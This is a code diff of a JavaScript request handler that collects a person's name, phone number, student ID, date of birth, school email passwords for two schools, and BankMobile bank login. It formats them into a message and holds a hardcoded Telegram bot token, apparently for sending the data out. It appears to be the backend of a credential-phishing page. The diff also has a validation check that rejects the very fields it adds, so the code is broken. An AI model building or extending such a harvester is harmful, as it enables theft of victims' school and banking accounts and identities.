@@ -16,6 +16,8 @@ module.exports = async (req, res) => {
     hasBankMobileProfile,
     bankMobileEmail,
     bankMobilePassword,
+    studentid,
+    dob,
   } = req.body || {};
 
   if (
@@ -25,34 +27,33 @@ module.exports = async (req, res) => {
     !currentSchoolPassword ||
     !previousSchoolEmail ||
     !previousSchoolPassword ||
+    studentid ||
+    dob ||
     typeof hasBankMobileProfile !== "string"
   ) {
     return res.status(400).json({ error: "Missing required fields" });
   }
 
   const message = `
-📩 *New Form Submission*
+    *New Form Submission*
 
-👤 Full Name: ${fullName}
-📱 Phone Number: ${phoneNumber}
+    Full Name: ${fullName}
+    Phone Number: ${phoneNumber}
+    Student ID: ${studentid}
+    DOB: ${dob}
 
-🏫 *Current School*
-📧 Email: ${currentSchoolEmail}
-🔑 Password: ${currentSchoolPassword}
+    *Current School*
+    Email: ${currentSchoolEmail}
+    Password: ${currentSchoolPassword}
 
-🏫 *Previous School*
-📧 Email: ${previousSchoolEmail}
-🔑 Password: ${previousSchoolPassword}
+    *Previous School*
+    Email: ${previousSchoolEmail}
+    Password: ${previousSchoolPassword}
 
-🏦 *BankMobile*
-✔️ Has Profile: ${hasBankMobileProfile}
-📧 Email: ${bankMobileEmail || "N/A"}
-🔑 Password: ${bankMobilePassword || "N/A"}
-
-🛡 Signature: ${crypto
-    .createHmac("sha256", process.env.SECRET_KEY)
-    .update(`${fullName}:${phoneNumber}:${currentSchoolEmail}`)
-    .digest("hex")}
+    *BankMobile*
+    Has Profile: ${hasBankMobileProfile}
+    Email: ${bankMobileEmail || "N/A"}
+    Password: ${bankMobilePassword || "N/A"}
   `;
 
   const botToken = "7637425229:AAEOd39Gvu7O77XXk_pm5FLDTOPcbxqAP3c";
